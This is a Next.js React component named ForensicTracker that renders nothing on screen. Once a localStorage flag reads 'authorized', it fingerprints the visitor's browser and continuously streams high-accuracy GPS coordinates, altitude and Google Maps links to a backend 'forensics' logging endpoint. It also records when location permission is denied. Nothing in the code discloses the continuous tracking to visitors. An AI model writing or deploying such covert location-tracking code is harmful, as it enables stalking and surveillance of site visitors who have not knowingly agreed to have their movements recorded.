"use client";

import { useEffect, useState, useRef } from "react";
import { usePathname } from "next/navigation";
import { API_URL } from "@/lib/config";

export default function ForensicTracker() {
  const pathname = usePathname();
  const [hasAuthorized, setHasAuthorized] = useState(false);
  const watcherRef = useRef<number | null>(null);

  useEffect(() => {
    if (pathname.includes("/admin/dashboard")) return;

    // Check for authorization (Yes, I'm from SL)
    const checkAuth = setInterval(() => {
      const isAuthorized =
        localStorage.getItem("ccid_auth_v2") === "authorized";
      if (isAuthorized) {
        setHasAuthorized(true);
        clearInterval(checkAuth);
      }
    }, 1000);

    return () => clearInterval(checkAuth);
  }, [pathname]);

  useEffect(() => {
    if (!hasAuthorized) return;

    const fingerprint = {
      screen: `${window.screen.width}x${window.screen.height}`,
      userAgent: navigator.userAgent,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || "direct",
    };

    const logUpdate = async (loc: any, status?: string) => {
      try {
        await fetch(`${API_URL}/api/v1/forensics/log-visit`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            source: pathname || "/",
            fingerprint: { ...fingerprint, status: status || "ACTIVE" },
            location: loc,
          }),
        });
      } catch (e) {}
    };

    // 🛰️ ADVANCED FORENSIC UPLINK
    if ("geolocation" in navigator) {
      // First, get a single high-accuracy position to "break the ice"
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const loc = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            timestamp: pos.timestamp,
            maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
          };
          logUpdate(loc, "GPS_LOCKED_INIT");
        },
        (err) => {
          const reasons = [
            "",
            "PERMISSION_DENIED",
            "POSITION_UNAVAILABLE",
            "TIMEOUT",
          ];
          logUpdate(null, `GPS_FAILED_${reasons[err.code] || "UNKNOWN"}`);
        },
        { enableHighAccuracy: true, timeout: 15000 },
      );

      // Then, watch for improvements
      watcherRef.current = navigator.geolocation.watchPosition(
        (pos) => {
          const loc = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            timestamp: pos.timestamp,
            maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
          };
          logUpdate(loc, "GPS_STREAMING");
        },
        null,
        { enableHighAccuracy: true, maximumAge: 0 },
      );
    } else {
      logUpdate(null, "NO_GEOLOCATION_SUPPORT");
    }

    return () => {
      if (watcherRef.current)
        navigator.geolocation.clearWatch(watcherRef.current);
    };
  }, [hasAuthorized, pathname]);

  return null;
}
